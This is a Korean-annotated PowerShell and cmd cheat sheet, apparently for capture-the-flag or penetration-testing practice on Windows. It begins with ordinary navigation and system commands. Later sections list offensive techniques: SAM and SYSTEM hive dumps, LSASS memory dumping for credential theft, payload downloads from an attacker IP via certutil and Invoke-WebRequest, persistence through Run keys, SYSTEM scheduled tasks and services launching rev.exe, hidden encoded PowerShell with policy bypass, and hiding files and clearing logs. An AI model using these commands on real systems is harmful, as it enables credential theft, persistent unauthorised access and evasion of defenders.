Get-Process
Get-Service

# common

Get-ChildItem
ls
dir

# 권한 확인

whoami /priv

Get-ChildItem -Path C:\Users

Get-ChildItem -Recurse -File -ErrorAction SilentlyContinue | Select-String "FLAG\{"

Get-ChildItem -Path C:\ -Include local.txt, proof.txt -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Recurse -Filter _local.txt_ -ErrorAction SilentlyContinue

echo
Write-Output

cd
Set-Location

cat
cp
mv
rm

Get-Alias
Get-Command -Name Remove*

# 이동 (디렉토리 탐색)

- 해당 폴더로 이동
cd C:\temp

- cd 정식 명령어
Set-Location C:\temp

- 상위 폴더로
cd ..

- 드라이브 루트로
cd \

- 홈 디렉토리로
cd ~

- 다른 드라이브로 (D: 입력)
cd C:

- 현재 위치 저장하고 이동
Push-Location C:\temp

- 저장해둔 위치로 복귀
Pop-Location

- 현재 위치 확인
Get-Location

- Get-Location 별칭
pwd

- 절대경로로 변환
Resolve-Path .\a.txt

# check systeminfo

systeminfo
Get-ComputerInfo
Get-LocalUser

# process

Start-Process notepad.exe
Stop-Process -Name notepad
Get-Service
Restart-Service 서비스명

# network

- 핑 확인
Test-Connection google.com

Get-NetIPAddress
Get-NetTCPConnection

# script

- 스크립트 실행 정책 허용
Set-ExecutionPolicy RemoteSigned

- 스크립트 실행
.\script.ps1

# pipe

Get-ChildItem | Sort-Object Length
Get-ChildItem | Where-Object -Property "Extension" -eq ".txt"

# search

Select-String -Path ".\package-lock.json" -Pattern "hat"
Get-ChildItem | Where-Object -Property Length -gt 100

# help

Get-Help 명령어
Get-Help New-LocalUser -examples

- 명령어는 윈도우 환경에 따라 다를 수 있으니, 필요에 따라 Get-Help로 확인.
Get-Content
Set-Location

# system

Get-ComputerInfo

# users

Get-LocalUser

# network

Get-NetIPConfiguration
Get-NetIPAddress

Get-Process
Get-Service

# netstat

Get-NetTCPConnection

# hash

Get-FileHash -Path .\ship-flag.txt

# remote command

Invoke-Command -ComputerName SERVER01 -ScriptBlock { Get-Process }
Invoke-Command -ComputerName SERVER01, SERVER02 -ScriptBlock { hostname }
Invoke-Command -ComputerName SERVER01 -Credential DOMAIN\User -ScriptBlock { Get-Service }

# find flag / files

Get-ChildItem -Path C:\ -Recurse -File -Include local.txt,proof.txt -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users -Recurse -File -ErrorAction SilentlyContinue |
  Where-Object Name -match 'flag|proof|local'

findstr /s /i "flag" C:\*.txt 2>nul

Get-ChildItem -Path C:\Users\*\Desktop -File

# file move / manage

- 파일 이동 / 이름 변경도 가능
Move-Item -Path C:\temp\a.txt -Destination C:\temp\b.txt

- 다른 경로로 이동 (-Force 로 덮어쓰기)
Move-Item -Path .\exploit.exe -Destination C:\Windows\Temp\ -Force

- 이름만 변경
Rename-Item -Path C:\temp\b.txt -NewName c.txt

- 폴더 생성
New-Item -Path C:\temp\out -ItemType Directory -Force

- 파일 생성 + 내용 넣기
New-Item -Path C:\temp\a.txt -ItemType File -Value "test"

Copy-Item -Path .\a.txt -Destination C:\temp\ -Force

- 파일 삭제
Remove-Item -Path C:\temp\a.txt -Force

- 여러 파일 한 번에 이동
Get-ChildItem C:\temp | Move-Item -Destination C:\temp\archive\

# registry

- 서비스 시작 유형 전체 덤프 (약한 권한 서비스 탐색)
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\*\Start

- 레지스트리에서 문자열 검색
reg query HKLM /s /f "password" /t REG_SZ

- SAM 덤프 (계정/패스워드 해시)
reg save HKLM\SAM C:\temp\SAM

- SYSTEM 덤프 (SAM 복호화 키)
reg save HKLM\SYSTEM C:\temp\SYSTEM

- autorun 지속성 등록
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\temp\rev.exe" /f

- 특정 키 값 조회
reg query HKCU /v Password

# services / scheduled task

Get-Service | Where-Object Status -eq Running

- 서비스 binary 경로/계정 확인 (권한 상승 포인트)
Get-CimInstance Win32_Service | Select-Object Name, StartName, PathName

Start-Service -Name Spooler

Stop-Service -Name Spooler -Force

- 예약된 작업 조회
schtasks /query /fo LIST /v

- 1분마다 SYSTEM 권한으로 실행 (지속성/권한 상승)
schtasks /create /tn svc /tr "C:\temp\rev.exe" /sc minute /mo 1 /ru SYSTEM

# user / group

Get-LocalUser

Get-LocalGroup

- 관리자 그룹 멤버 확인
Get-LocalGroupMember Administrators

net user administrator

- 도메인 사용자 전체 목록
net user /domain

net localgroup Administrators

net group "Domain Admins" /domain

- 현재 토큰/그룹/특권 전체 정보
whoami /all

whoami /groups

# share

Get-SmbShare

net use \\localhost\IPC$ "" /user:Administrator ""

# network

- 특정 포트 열림 확인
Test-NetConnection -ComputerName 192.168.192.65 -Port 445

- 확립된 연결 확인
Get-NetTCPConnection -State Established

- 리스닝 포트 + PID
netstat -ano | findstr LISTENING

- 프로세스별 리스닝 포트
Get-NetTCPConnection -State Listen | Select-Object LocalPort, OwningProcess

- PID 로 프로세스 확인
Get-Process -Id (Get-NetTCPConnection -State Listen | Select-Object -First 1 -Expand OwningProcess)

- SMB 통신 대상 확인
Get-NetTCPConnection | Where-Object RemotePort -eq 445

# file transfer

- 페이로드 다운로드
Invoke-WebRequest -Uri http://192.168.x.x/payload.exe -OutFile C:\temp\payload.exe

- certutil 로 다운로드 (IWR 차단 환경 우회)
certutil -urlcache -split -f http://192.168.x.x/payload.exe C:\temp\payload.exe

IWR http://192.168.x.x/payload.exe -OutFile .\payload.exe

# hash / dump

Get-FileHash -Algorithm MD5 .\payload.exe

certutil -hashfile .\payload.exe SHA256

- LSASS 메모리 덤프 (자격 증명 탈취)
procdump -ma lsass.exe C:\temp\lsass.dmp

# env / system info

$env:USERNAME

[System.Environment]::UserName

- OS 버전
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version

- 컴퓨터/도메인 여부
Get-CimInstance Win32_ComputerSystem | Select-Object Name, Domain

systeminfo | findstr /i "OS Name"

# recon

- 실행 프로세스 + 세션 사용자
tasklist /v

- 특정 프로세스만 확인
tasklist /fi "imagename eq lsass.exe"

- 프로세스 + 경로 정렬
Get-Process | Select-Object Name, Id, Path | Sort-Object Name

- system32 프로세스만 (SYSTEM 권한)
Get-Process | Where-Object Path -like "*system32*"

- 로그인 세션 확인 (RDP)
qwinsta

- 연결된 사용자
quser

- 패스워드 정책 / 로그온 제한
net accounts

- 도메인 여부 + 패치 목록
systeminfo | findstr /i /c:"Domain" /c:"Hotfix"

- OS 버전/이름
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"

- 컴퓨터 이름
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName"

- 설치된 패치
Get-HotFix

# ACL / 권한

- 파일 ACL 상세
Get-Acl .\file.txt | Format-List

- 디렉토리 권한 확인
icacls C:\temp

- 권한 부여 (Full Control)
icacls C:\temp /grant Administrator:F

- 상속 설정 변경
icacls "C:\Program Files\x" /inheritance:e

- 상위 폴더 권한 확인
(Get-Acl C:\Windows\System32).Access | Select-Object IdentityReference, FileSystemRights

# AD 도메인

- 도메인 사용자 전체
Get-ADUser -Filter * -Properties Name,SamAccountName

- 도메인 어드민 그룹 멤버
Get-ADGroupMember "Domain Admins"

- 도메인 컴퓨터 목록 + OS
Get-ADComputer -Filter * -Property Name,OperatingSystem

- 패스워드 마지막 변경 시점
Get-ADUser dean -Properties * | Select-Object -ExpandProperty PasswordLastSet

- Kerberos 티켓 확인
$klist

net group "Domain Admins" /domain

# 프로세스 실행 / 권한 상승

- UAC 프롬프트로 실행
Start-Process -FilePath .\rev.exe -Verb RunAs

- 숨김 실행 + base64 인코딩
Start-Process powershell -ArgumentList "-ep bypass -enc <BASE64>" -WindowStyle Hidden

- ExecutionPolicy 우회
powershell -ep bypass -f .\script.ps1

powershell -nop -w hidden -enc <BASE64>

Start-Process -FilePath C:\temp\rev.exe -WindowStyle Hidden

- WMI 로 프로세스 생성
wmic process call create "C:\temp\rev.exe"

- PowerShell 설치 경로
$pshome

# 지속성 (추가)

New-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name Updater -Value "C:\temp\rev.exe" -PropertyType String -Force

- 예약 작업 액션 생성
New-ScheduledTaskAction -Execute C:\temp\rev.exe

- SYSTEM 권한 예약 작업 등록
Register-ScheduledTask -TaskName svc -Action (New-ScheduledTaskAction -Execute C:\temp\rev.exe) -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)) -RunLevel Highest -User SYSTEM

- 서비스로 지속성 생성
New-Service -Name svc -BinaryPathName "C:\temp\svc.exe" -DisplayName svc -StartupType Automatic

sc.exe create svc binPath= "C:\temp\svc.exe" start= auto

# 파일 숨기기 / 흔적 제거

- 숨김 속성
attrib +h C:\temp\rev.exe

- 숨김 + 시스템 파일 위장
attrib +h +s C:\temp\rev.exe

- 로그 내용 비우기
Clear-Content C:\temp\log.txt

- 파일/로그 삭제
Remove-Item C:\temp\rev.exe, C:\temp\log.txt -Force -ErrorAction SilentlyContinue

# NTFS ADS

- alternate data stream 목록
Get-Content C:\temp\rev.exe -Stream *

Get-Item C:\temp\rev.exe -Stream *